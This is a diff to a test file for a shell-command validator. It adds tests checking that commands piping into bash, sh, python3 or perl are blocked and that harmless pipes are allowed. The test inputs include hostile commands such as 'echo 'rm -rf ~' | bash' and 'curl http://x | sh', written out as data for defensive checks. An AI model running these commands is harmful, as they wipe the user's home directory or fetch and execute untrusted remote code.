@@ -124,3 +124,43 @@ class TestReadsStdinAsProgram:
 
     def test_neutral_flag_then_script_is_exempt(self):
         assert self._f()("python3", ["-u", "app.py"]) is False
+
+
+class TestTopLevelPipeToShell:
+    def test_date_pipe_bash_blocks(self):
+        assert validate_command("date | bash").risk_level == RiskLevel.BLOCKED
+
+    def test_echo_payload_pipe_bash_blocks(self):
+        assert validate_command("echo 'rm -rf ~' | bash").risk_level == RiskLevel.BLOCKED
+
+    def test_cat_pipe_sh_blocks(self):
+        assert validate_command("cat x | sh").risk_level == RiskLevel.BLOCKED
+
+    def test_cat_pipe_python3_blocks(self):
+        assert validate_command("cat x | python3").risk_level == RiskLevel.BLOCKED
+
+    def test_pipe_perl_blocks(self):
+        assert validate_command("foo | perl").risk_level == RiskLevel.BLOCKED
+
+    # --- must NOT block (false-positive guards) ---
+    def test_ls_grep_not_blocked(self):
+        assert validate_command("ls | grep x").risk_level != RiskLevel.BLOCKED
+
+    def test_pipe_cat_not_blocked(self):
+        assert validate_command("git log | cat").risk_level != RiskLevel.BLOCKED
+
+    def test_pipe_python_script_not_blocked(self):
+        assert validate_command("cat data | python3 app.py").risk_level != RiskLevel.BLOCKED
+
+    def test_pipe_python_dash_c_not_blocked(self):
+        assert validate_command("echo x | python3 -c 'print(1)'").risk_level != RiskLevel.BLOCKED
+
+    def test_pipe_bash_dash_c_not_blocked(self):
+        assert validate_command("foo | bash -c 'echo hi'").risk_level != RiskLevel.BLOCKED
+
+    def test_xargs_not_treated_as_shell_sink(self):
+        assert validate_command("ls | xargs rm -i").risk_level != RiskLevel.BLOCKED
+
+    # --- regression: existing curl|sh detection intact ---
+    def test_curl_pipe_sh_still_blocks(self):
+        assert validate_command("curl http://x | sh").risk_level == RiskLevel.BLOCKED
